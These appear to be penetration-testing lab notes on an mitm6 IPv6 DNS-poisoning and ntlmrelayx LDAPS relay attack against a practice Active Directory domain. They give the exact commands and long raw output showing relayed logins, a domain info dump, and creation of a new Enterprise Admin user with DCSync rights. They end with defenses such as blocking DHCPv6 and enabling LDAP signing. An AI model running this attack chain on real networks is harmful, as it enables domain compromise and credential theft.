#mitm6 #IPv6 #ntlmrelayx #LDAP #NTLM 
Acts as a DNS for IPv6 requests. 

Form of NTLM
	Just like Responder and SMBRelay

LDAP Relay


Should be installed with pimpmykali, if not run this:

`cd /opt/mitm6`

`sudo pip2 install .`

# Run mitm6:

`ntlmrelayx.py -6 -t ldaps://192.168.95.132 -wh fakewpad.marvel.local -l lootme` ~~~ new tab, point to DC. ~~~ run this before mitm6 and ensure no errors.

`sudo mitm6 -d marvel.local`

* Any event (reboot/login) will allow us to take the event, and relay to DC.

Don't run more than 10 minutes, can cause network outages.

ntlmrelayx.py results:
(from a reboot)
```
┌─(~/Documents/PEH)─────────────────────────────────────(kali@kali:pts/1)─┐
└─(14:45:54)──> ntlmrelayx.py -6 -t ldaps://192.168.95.132 -wh fakepad.marvel.local -l lootme 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server

[*] Setting up HTTP Server
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.95.133
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] Authenticating against ldaps://192.168.95.132 as MARVEL\THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Authenticating against ldaps://192.168.95.132 as MARVEL\THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.95.133
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443
[*] HTTPD: Client requested path: geo.prod.do.dsp.mp.microsoft.com:443
[*] Authenticating against ldaps://192.168.95.132 as MARVEL\THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: geover.prod.do.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: geover.prod.do.dsp.mp.microsoft.com:443
[*] HTTPD: Client requested path: geover.prod.do.dsp.mp.microsoft.com:443
[*] Authenticating against ldaps://192.168.95.132 as MARVEL\THEPUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: cp501.prod.do.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.95.133, attacking target ldaps://192.168.95.132
[*] HTTPD: Client requested path: cp501.prod.do.dsp.mp.microsoft.com:443

```

mitm6 results:
(from a reboot)
```
┌─(~/Documents/PEH)─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────(kali@kali:pts/4)─┐
└─(14:46:40)──> sudo mitm6 -d marvel.local                                                                                                  ──(Wed,Jun26)─┘
[sudo] password for kali: 
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:8a:29:58]
IPv4 address: 192.168.95.130
IPv6 address: fe80::f8cf:e62a:6360:36c
DNS local search domain: marvel.local
DNS allowlist: marvel.local
WARNING: No route found for IPv6 destination fe80::b938:9eb2:141d:52bb (no default route?)
WARNING: No route found for IPv6 destination fe80::1d6b:1307:9279:9850 (no default route?)
WARNING: more No route found for IPv6 destination fe80::7dd1:97b2:af22:ccab (no default route?)
IPv6 address fe80::7970:1 is now assigned to mac=00:0c:29:75:e3:bd host=THEPUNISHER.MARVEL.local. ipv4=
IPv6 address fe80::7970:2 is now assigned to mac=00:0c:29:33:c3:e4 host=SPIDERMAN.MARVEL.local. ipv4=
IPv6 address fe80::7970:3 is now assigned to mac=00:0c:29:b7:5d:a9 host=HYDRA-DC.MARVEL.local. ipv4=
IPv6 address fe80::7970:4 is now assigned to mac=00:50:56:c0:00:08 host=Tafel_Desktop. ipv4=
Sent spoofed reply for wpad.MARVEL.local. to fe80::b938:9eb2:141d:52bb
Sent spoofed reply for wpad.MARVEL.local. to fe80::b938:9eb2:141d:52bb
Sent spoofed reply for wpad.marvel.local. to fe80::b938:9eb2:141d:52bb
Sent spoofed reply for fakepad.marvel.local. to fe80::b938:9eb2:141d:52bb
Sent spoofed reply for hydra-dc.marvel.local. to fe80::b938:9eb2:141d:52bb
Sent spoofed reply for fakepad.marvel.local. to fe80::b938:9eb2:141d:52bb
WARNING: No route found for IPv6 destination fe80::b938:9eb2:141d:52bb (no default route?)
WARNING: No route found for IPv6 destination fe80::b938:9eb2:141d:52bb (no default route?)
IPv6 address fe80::7970:5 is now assigned to mac=00:0c:29:75:e3:bd host=THEPUNISHER.MARVEL.local. ipv4=
WARNING: No route found for IPv6 destination fe80::b938:9eb2:141d:52bb (no default route?)
WARNING: No route found for IPv6 destination fe80::b938:9eb2:141d:52bb (no default route?)
IPv6 address fe80::7970:6 is now assigned to mac=00:0c:29:75:e3:bd host=THEPUNISHER.MARVEL.local. ipv4=
WARNING: No route found for IPv6 destination fe80::7970:2 (no default route?)
Renew reply sent to fe80::7970:2
WARNING: No route found for IPv6 destination fe80::7970:3 (no default route?)
Renew reply sent to fe80::7970:3
WARNING: more No route found for IPv6 destination fe80::7970:4 (no default route?)
Renew reply sent to fe80::7970:4
```

Loot is saved in the `lootme` folder specified in ntlmrelayx.py command:

```
┌─(~/Documents/PEH/lootme)─────────────────────────────────────────────(kali@kali:pts/2)─┐
└─(14:49:02)──> ll                                                         ──(Wed,Jun26)─┘
total 212K
-rw-rw-r-- 1 kali kali 2.4K Jun 26 14:47 domain_computers_by_os.html
-rw-rw-r-- 1 kali kali  772 Jun 26 14:47 domain_computers.grep
-rw-rw-r-- 1 kali kali 1.9K Jun 26 14:47 domain_computers.html
-rw-rw-r-- 1 kali kali  12K Jun 26 14:47 domain_computers.json
-rw-rw-r-- 1 kali kali  10K Jun 26 14:47 domain_groups.grep
-rw-rw-r-- 1 kali kali  17K Jun 26 14:47 domain_groups.html
-rw-rw-r-- 1 kali kali  79K Jun 26 14:47 domain_groups.json
-rw-rw-r-- 1 kali kali  258 Jun 26 14:47 domain_policy.grep
-rw-rw-r-- 1 kali kali 1.2K Jun 26 14:47 domain_policy.html
-rw-rw-r-- 1 kali kali 5.2K Jun 26 14:47 domain_policy.json
-rw-rw-r-- 1 kali kali   71 Jun 26 14:47 domain_trusts.grep
-rw-rw-r-- 1 kali kali  828 Jun 26 14:47 domain_trusts.html
-rw-rw-r-- 1 kali kali    2 Jun 26 14:47 domain_trusts.json
-rw-rw-r-- 1 kali kali  15K Jun 26 14:47 domain_users_by_group.html
-rw-rw-r-- 1 kali kali 1.9K Jun 26 14:47 domain_users.grep
-rw-rw-r-- 1 kali kali 5.7K Jun 26 14:47 domain_users.html
-rw-rw-r-- 1 kali kali  17K Jun 26 14:47 domain_users.json
```

This is an awesome tool and html shows loot in a nice table!

* Groups and Computers, Domain Users by Group

ntlmrelayx results:
(from a login to Admin)
```
[*] Authenticating against ldaps://192.168.95.132 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x9eF\x0f\xe3:\xcb}#\xf8+=(\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x9eF\x0f\xe3:\xcb}#\xf8+=(\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x9eF\x0f\xe3:\xcb}#\xf8+=(\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x9eF\x0f\xe3:\xcb}#\xf8+=(\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x9eF\x0f\xe3:\xcb}#\xf8+=(\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
[*] Adding new user with username: KzhlRYzkCb and password: I}p1KZe~Oo"(Jjo result: OK
[*] Querying domain security descriptor
[*] Success! User KzhlRYzkCb now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20240626-150352.restore

```


It created a new user for us and added it to the group Enterprise Admin! Giving us access, to compromise the domiain:
* User: `KzhlRYzkCb`
* Password: `I}p1KZe~Oo"(Jjo`
	* Use DCSync with secretsdump.py for further attacks


# IPv6 Attack Defenses
* Disable IPv6 internally, HOWEVER, would affect networks
	* IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to **block DHCPv6 traffic and incoming router advertisements** in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following rules to Block instead of Allow prevents the attack from working:
		* **(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)**
		* **(Inbound) Core Networking - Router Advertisement (ICMPv6-In)**
		* **(Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)**
	* If WPAD is not in use internally, disable it via Group Policy and by **disabling the WinHttpAutoProxySvc service**.
	* Relaying to LDAP and LDAPS can only be mitigated by **enabling both LDAP signing and LDAP channel binding**.
	* Consider Administrative users to the **Protected Users group** or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

